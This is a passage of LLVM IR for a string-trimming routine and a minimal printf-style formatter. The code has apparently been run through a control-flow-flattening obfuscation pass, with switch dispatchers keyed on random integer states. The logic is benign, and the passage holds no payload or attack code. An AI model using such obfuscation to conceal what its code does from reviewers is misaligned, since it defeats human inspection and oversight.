  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1514576878, label %10
    i32 -1453419690, label %20
    i32 -527355324, label %23
    i32 1221063431, label %24
    i32 -1685383159, label %29
    i32 983603881, label %38
    i32 925218971, label %40
    i32 1829660100, label %43
    i32 2083654517, label %45
    i32 159212027, label %50
    i32 1363770284, label %62
    i32 -1842606290, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 -1453419690, i32 -527355324
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 -1514576878, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 1221063431, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -1685383159, i32 983603881
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #10
  %37 = icmp ne i32 %36, 0
  store i32 983603881, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 925218971, i32 1829660100
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 1221063431, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 2083654517, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 159212027, i32 -1842606290
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 1363770284, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 2083654517, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #4

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 1528036982, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i32*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1528036982, label %12
    i32 -1290381951, label %18
    i32 -1939833267, label %24
    i32 -976630705, label %32
    i32 -81389197, label %33
    i32 -2092611200, label %39
    i32 1111901570, label %40
    i32 699498749, label %46
    i32 -1727993284, label %49
    i32 -1060763442, label %50
    i32 -739339647, label %56
    i32 -1147837118, label %61
    i32 -1857794432, label %62
    i32 1610814985, label %68
    i32 953039630, label %73
    i32 -1354436743, label %75
    i32 -1952517290, label %84
    i32 2127261826, label %87
    i32 1451159176, label %93
    i32 -1758608114, label %99
    i32 755240825, label %105
    i32 1900419143, label %110
    i32 2144360650, label %118
    i32 51491901, label %120
    i32 253917883, label %121
    i32 437425976, label %127
    i32 -392426411, label %133
    i32 298037555, label %140
    i32 -1804783825, label %146
    i32 1307912242, label %151
    i32 -1254550038, label %158
    i32 -573941478, label %164
    i32 -1027050460, label %171
    i32 -799748117, label %177
    i32 2104081313, label %182
    i32 -920003858, label %189
    i32 2004022445, label %195
    i32 234040986, label %202
    i32 -875234561, label %208
    i32 820570572, label %213
    i32 1769167106, label %220
    i32 -999581429, label %226
    i32 -667187808, label %233
    i32 1596568400, label %239
    i32 -2109238727, label %244
    i32 -4194223, label %251
    i32 1829848974, label %257
    i32 -1425215865, label %263
    i32 40044001, label %269
    i32 -538516914, label %274
    i32 2073080163, label %286
    i32 -1115277523, label %287
    i32 272058394, label %288
    i32 -2060088928, label %295
    i32 1651213077, label %296
    i32 947763276, label %299
    i32 -2035001315, label %303
    i32 1397640154, label %306
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 -1290381951, i32 947763276
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 -1939833267, i32 -1115277523
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 -976630705, i32 -81389197
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 947763276, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 -2092611200, i32 1111901570
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 272058394, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 699498749, i32 -1727993284
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 -1727993284, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 -1060763442, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 -739339647, i32 -1147837118
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 -1060763442, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -1857794432, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 1610814985, i32 953039630
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 953039630, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 -1354436743, i32 2127261826
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 -1952517290, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 -1857794432, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 1451159176, i32 437425976
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 -1758608114, i32 755240825
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i32*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 1900419143, i32* %switchVar
  store i32* %103, i32** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i32*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 1900419143, i32* %switchVar
  store i32* %108, i32** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i32*, i32** %.reg2mem78
  %111 = load i32, i32* %.reload79, align 4
  %112 = sext i32 %111 to i64
  %113 = inttoptr i64 %112 to i8*
  store i8* %113, i8** %11, align 8
  %114 = load i8**, i8*** %4, align 8
  store i8** %114, i8*** %.reg2mem11
  %115 = load i8*, i8** %11, align 8
  %116 = icmp ne i8* %115, null
  %117 = select i1 %116, i32 2144360650, i32 51491901
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8*, i8** %11, align 8
  store i32 253917883, i32* %switchVar
  store i8* %119, i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 253917883, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.88, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %122 = load i32, i32* %7, align 4
  %123 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %124 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %122, i32 %123)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, %124
  store i32 %126, i32* %9, align 4
  store i32 1651213077, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 100
  %132 = select i1 %131, i32 -392426411, i32 -1254550038
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8**, i8*** %4, align 8
  store i8** %134, i8*** %.reg2mem13
  %135 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %135, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %136, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %137 = load i32, i32* %.reload21, align 8
  store i32 %137, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %138 = icmp ule i32 %.reload25, 40
  %139 = select i1 %138, i32 298037555, i32 -1804783825
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %142 = load i8*, i8** %141, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %143 = getelementptr i8, i8* %142, i32 %.reload24
  %144 = bitcast i8* %143 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %145 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %145, i32* %.reload20, align 8
  store i32 1307912242, i32* %switchVar
  store i32* %144, i32** %.reg2mem82
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %148 = load i8*, i8** %147, align 8
  %149 = bitcast i8* %148 to i32*
  %150 = getelementptr i8, i8* %148, i32 8
  store i8* %150, i8** %147, align 8
  store i32 1307912242, i32* %switchVar
  store i32* %149, i32** %.reg2mem82
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %152 = load i32, i32* %.reload83, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %155 = call i32 @printi(i8** %.reload14, i32 %152, i32 10, i32 1, i32 %153, i32 %154, i32 97)
  %156 = load i32, i32* %9, align 4
  %157 = add nsw i32 %156, %155
  store i32 %157, i32* %9, align 4
  store i32 1651213077, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 120
  %163 = select i1 %162, i32 -573941478, i32 -920003858
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8**, i8*** %4, align 8
  store i8** %165, i8*** %.reg2mem26
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %166, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %167, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %168 = load i32, i32* %.reload34, align 8
  store i32 %168, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %169 = icmp ule i32 %.reload38, 40
  %170 = select i1 %169, i32 -1027050460, i32 -799748117
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %172 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %173 = load i8*, i8** %172, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %174 = getelementptr i8, i8* %173, i32 %.reload37
  %175 = bitcast i8* %174 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %176 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %176, i32* %.reload33, align 8
  store i32 2104081313, i32* %switchVar
  store i32* %175, i32** %.reg2mem84
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %179 = load i8*, i8** %178, align 8
  %180 = bitcast i8* %179 to i32*
  %181 = getelementptr i8, i8* %179, i32 8
  store i8* %181, i8** %178, align 8
  store i32 2104081313, i32* %switchVar
  store i32* %180, i32** %.reg2mem84
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %183 = load i32, i32* %.reload85, align 4
  %184 = load i32, i32* %7, align 4
  %185 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %186 = call i32 @printi(i8** %.reload27, i32 %183, i32 16, i32 0, i32 %184, i32 %185, i32 97)
  %187 = load i32, i32* %9, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %9, align 4
  store i32 1651213077, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8*, i8** %5, align 8
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 88
  %194 = select i1 %193, i32 2004022445, i32 1769167106
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  store i8** %196, i8*** %.reg2mem39
  %197 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %197, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %198 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %198, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %199 = load i32, i32* %.reload47, align 8
  store i32 %199, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %200 = icmp ule i32 %.reload51, 40
  %201 = select i1 %200, i32 234040986, i32 -875234561
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %205 = getelementptr i8, i8* %204, i32 %.reload50
  %206 = bitcast i8* %205 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %207 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %207, i32* %.reload46, align 8
  store i32 820570572, i32* %switchVar
  store i32* %206, i32** %.reg2mem86
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  store i32 820570572, i32* %switchVar
  store i32* %211, i32** %.reg2mem86
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %214 = load i32, i32* %.reload87, align 4
  %215 = load i32, i32* %7, align 4
  %216 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %217 = call i32 @printi(i8** %.reload40, i32 %214, i32 16, i32 0, i32 %215, i32 %216, i32 65)
  %218 = load i32, i32* %9, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %9, align 4
  store i32 1651213077, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 117
  %225 = select i1 %224, i32 -999581429, i32 -4194223
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  store i8** %227, i8*** %.reg2mem52
  %228 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %228, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %229 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %229, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %230 = load i32, i32* %.reload60, align 8
  store i32 %230, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %231 = icmp ule i32 %.reload64, 40
  %232 = select i1 %231, i32 -667187808, i32 1596568400
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %235 = load i8*, i8** %234, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %236 = getelementptr i8, i8* %235, i32 %.reload63
  %237 = bitcast i8* %236 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %238 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %238, i32* %.reload59, align 8
  store i32 -2109238727, i32* %switchVar
  store i32* %237, i32** %.reg2mem88
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %240 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %241 = load i8*, i8** %240, align 8
  %242 = bitcast i8* %241 to i32*
  %243 = getelementptr i8, i8* %241, i32 8
  store i8* %243, i8** %240, align 8
  store i32 -2109238727, i32* %switchVar
  store i32* %242, i32** %.reg2mem88
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %245 = load i32, i32* %.reload89, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %248 = call i32 @printi(i8** %.reload53, i32 %245, i32 10, i32 0, i32 %246, i32 %247, i32 97)
  %249 = load i32, i32* %9, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %9, align 4
  store i32 1651213077, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 99
  %256 = select i1 %255, i32 1829848974, i32 2073080163
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %258, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %259, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %260 = load i32, i32* %.reload71, align 8
  store i32 %260, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %261 = icmp ule i32 %.reload75, 40
  %262 = select i1 %261, i32 -1425215865, i32 40044001
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
